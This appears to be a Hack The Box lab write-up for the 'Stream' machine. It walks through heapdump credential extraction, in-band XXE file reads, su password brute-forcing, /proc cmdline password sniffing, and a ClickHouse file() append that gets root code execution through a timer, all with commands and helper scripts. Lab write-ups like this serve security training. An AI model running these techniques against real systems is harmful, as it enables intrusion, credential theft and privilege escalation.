# Stream — HTB Write-up

**Author:** DonMorpheus (lab)
**Machine:** Stream (Release Arena, Linux)
**Hosts:** `htb-airport.htb` / `api.htb-airport.htb` / `db.htb-airport.htb`
**Scope:** HTB VPN / personal lab only

> **No flags** in this document. Passwords stay in `secrets.env` (see `secrets.example.env`).

Scripts: [`scripts/`](scripts/).

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | 22 SSH (fail2ban), 80 nginx vhosts, 8081 uvicorn AIDX ingest. Kafka/CH native ports closed from VPN |
| Creds 1 | Spring `api…/actuator/heapdump` → Hikari `setUsername` / `setPassword` = ClickHouse `svc_events` |
| Read | Ingest accepts XML with DOCTYPE. Downstream **lxml `resolve_entities=True`**. Expansion lands in CH `partner_feed.flightleg_json.airline` |
| Foothold | XXE `file:///opt/kafka_2.13-4.3.1/config/server.properties` → SASL PLAIN `user_svc_infra` = SSH `svc-infra` |
| User | `su martin_cole` from inside that session (rockyou head). Do **not** hydra :22 |
| Root | `aidx-dlq-drainer.timer` every 2 min as root → `/proc` cmdline sniff of `clickhouse-client --password` → `GRANT FILE` append on `aidx_quarantine.py` → malformed AIDX wakes the drain |

```
Kali tun0
  │
  ├─ 80   nginx
  │        api.htb-airport.htb  → Spring gateway (actuator heapdump)
  │        db.htb-airport.htb   → ClickHouse HTTP
  └─ 8081 POST /feeds/aidx      → Kafka aidx.flightleg.raw.v1
                                   ├─ lxml OK  → partner_feed.flightleg_json
                                   └─ lxml FAIL → aidx.flightleg.dlq.v1
                                        └─ timer (root) python3 aidx_quarantine.py
```

---

## 1. Recon

```bash
echo '<TARGET_IP> htb-airport.htb api.htb-airport.htb db.htb-airport.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -p 22,80,8081,8123,9000,9092 <TARGET_IP>
```

Open from VPN: **22**, **80**, **8081**. `:8123` / `:9000` / `:9092` are localhost-only (nginx publishes ClickHouse HTTP on the `db` vhost).

```bash
curl -si http://<TARGET_IP>/                          # 301 → api.htb-airport.htb
curl -s http://api.htb-airport.htb/                   # gateway JSON, node tg-edge-01
curl -s http://api.htb-airport.htb/actuator           # _links includes heapdump
curl -s http://db.htb-airport.htb/                    # ClickHouse ping "Ok."
curl -s http://<TARGET_IP>:8081/                      # how to POST AIDX
curl -s http://<TARGET_IP>:8081/health                # raw_topic: aidx.flightleg.raw.v1
```

Ingest (`uvicorn`) does **not** parse XML. It string-matches four tags:

`IATA_AIDX_FlightLegNotifRQ`, `Originator`, `FlightLeg`, `LegIdentifier`

then publishes the **raw body** to Kafka. Empty body → 400; missing tags → 422; otherwise 202.

---

## 2. Heapdump → ClickHouse `svc_events`

Unauthenticated `/actuator` on the gateway exposes **only** `self` and a ~50–60 MB heapdump. Health/status are 200; env/mappings/beans are off.

```bash
curl -sI http://api.htb-airport.htb/actuator/heapdump    # Content-Length ~57M
curl -s -o heap.bin http://api.htb-airport.htb/actuator/heapdump
python3 scripts/heap_extract.py heap.bin
# strings -a heap.bin | grep -n -E 'setUsername|setPassword|svc_event|jdbc:'
```

Hikari neighbourhood:

```
setUsername  →  svc_events
setPassword  →  <CH_PASS>
setPoolName  →  terminal-edge-pool
```

That password is the ClickHouse HTTP Basic password for `svc_events` on `http://db.htb-airport.htb/`. `SHOW GRANTS` is SELECT/INSERT on `partner_feed.*` only. User `default` is `REQUIRED_PASSWORD` (empty 401).

```bash
export CH_PASS='...'
python3 scripts/ch_http.py -u svc_events -p "$CH_PASS" 'SHOW DATABASES'
python3 scripts/ch_http.py -u svc_events -p "$CH_PASS" 'SHOW GRANTS'
python3 scripts/ch_http.py -u svc_events -p "$CH_PASS" \
  'SHOW CREATE TABLE partner_feed.flightleg_json'
```

Column `airline` is the parsed `<Airline>` text. That is the in-band XXE channel.

`compose.yaml` / YAML-via-XXE is a dead end from the VPN: the file is missing, unreadable, or the expanded XML breaks the parser (`&` / `<`). Stay on heapdump + in-band `file://`.

---

## 3. In-band XXE (not OOB)

Parser behind Kafka is **lxml with `resolve_entities=True`**. `file://` expands **in the document tree**. The process does not fetch HTTP on tun0 (`no_network` and/or no egress). OOB DTD / webhook.site / `nc -lvnp 80` stay silent.

Put the entity in `<Airline>`, pick a unique `<FlightNumber>`, wait a few seconds, SELECT:

```bash
python3 scripts/xxe_read.py --target "$TARGET" --file /etc/passwd --flight P1
# or
python3 scripts/aidx_ingest.py --target "$TARGET" --xxe-file /etc/hostname --flight P1
sleep 5
python3 scripts/ch_http.py -u svc_events -p "$CH_PASS" \
  "SELECT flight_number, airline FROM partner_feed.flightleg_json WHERE flight_number='P1'"
```

Files whose content contains raw `&` or `<` after expansion never land in `flightleg_json` (parse error → DLQ). Kafka `server.properties` (comments + `user_svc_infra="..."`) is clean enough.

Login shells in passwd: `svc-infra`, `martin_cole`. `user.txt` is under `martin_cole`.

User path file:

```text
/opt/kafka_2.13-4.3.1/config/server.properties
```

JAAS line:

```
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=...
  user_svc_infra="<KAFKA_PASS>";
```

Same password as the OS account `svc-infra`. `$` in the secret → always **single quotes**.

---

## 4. SSH `svc-infra` → `su martin_cole`

```bash
ssh -o StrictHostKeyChecking=no svc-infra@<TARGET_IP>
```

**fail2ban on :22.** A four-worker hydra from Kali filters the port for ~10 minutes. Spray from VPN once, then hop **inside**.

```bash
getent passwd | awk -F: '$7 ~ /bash/'
# root, svc-infra, martin_cole
```

`su` delay is ~2 s per miss. Top of rockyou is enough. Copy the helper + a short list (do not expect `/usr/share/wordlists` on the box):

```bash
scp scripts/su_brute.py svc-infra@<TARGET_IP>:/dev/shm/
head -n 80 /usr/share/wordlists/rockyou.txt > /tmp/ry80.txt
scp /tmp/ry80.txt svc-infra@<TARGET_IP>:/dev/shm/
ssh svc-infra@<TARGET_IP> 'python3 /dev/shm/su_brute.py martin_cole /dev/shm/ry80.txt'
```

Then SSH as `martin_cole` with that password (or `su` from the same tty) and read `~/user.txt`.

---

## 5. Root — timer, argv, FILE, formatter

### Timer

As `svc-infra`:

```bash
systemctl list-timers aidx-dlq-drainer.timer
# OnUnitActiveSec=2min, User=root
# ExecStart=python3 /opt/ops/dlq_drainer.py
```

Drainer: consume `aidx.flightleg.dlq.v1` → run

```text
python3 /var/lib/clickhouse/user_files/aidx_quarantine.py
```

as **root**, stdin = the bad XML, then:

```bash
clickhouse-client --user default --password "$(cat /etc/partner-sync/ch.pw)"
```

`ch.pw` is `0600 root`. `/proc` has **hidepid=off**, so other UIDs' cmdline is readable.

### Sniff `--password`

`clickhouse-client` **blanks** the password in argv shortly after start. A `sleep 0.05` bash loop loses the race. Busy-loop with **no sleep**:

```bash
# ON THE BOX — do not pkill -f sniff.sh (that pattern also kills the SSH that launched it)
python3 proc_sniff.py --needle clickhouse-client --out /tmp/chhit.bin
```

Wake the drain from Kali (ingest 202, lxml fail):

```bash
python3 scripts/aidx_ingest.py --target "$TARGET" --malformed
# payload is scripts/payloads/dlq-malformed.xml — four required tags + trailing <<<
```

Within two minutes the sniffer writes `--password | <CH_DEFAULT_PASS>`. Later samples are spaces; keep the first hit.

### FILE → RCE

User `default` has `GRANT FILE`. ClickHouse `file()` reads and writes `/var/lib/clickhouse/user_files/`.

```bash
export CH_DEFAULT_PASS='...'
python3 scripts/ch_http.py -u default -p "$CH_DEFAULT_PASS" 'SHOW GRANTS'
python3 scripts/ch_file_append.py -u default -p "$CH_DEFAULT_PASS" --verify
```

`INSERT INTO FUNCTION file('aidx_quarantine.py','RawBLOB')` **appends**. Original formatter (~719 bytes) stays; the extra Python runs on the next drain.

Default payload in `ch_file_append.py` copies `/root/root.txt` → `/tmp/rflag` (0644) and writes `/tmp/pwned`. Pass `--payload` to append an `authorized_keys` line instead.

Trigger again:

```bash
python3 scripts/aidx_ingest.py --target "$TARGET" --malformed
# wait ≤2 min
ssh martin_cole@<TARGET_IP> 'cat /tmp/rflag /tmp/pwned'
```

---

## Operator notes

- OOB XXE is the wrong channel on this box. If `tcpdump` on tun0 is empty, switch to CH SELECT.
- Do not hydra SSH. fail2ban is faster than the wordlist.
- `pkill -f /tmp/sniff.sh` matches the SSH command line that started it. Start the sniffer and leave it.
- `clickhouse-client` wiping argv is the whole reason for a CPU-bound loop.
- Heap YAML inflate of the fat JAR often stops at CEN-only zip members. Hikari Strings are enough.
- Live IPs reset on RA. Scripts take `--target` / env vars.

## Lab setup

```bash
cp secrets.example.env secrets.env   # local only
# /etc/hosts as in §1
chmod +x scripts/*.py scripts/replay.sh
```
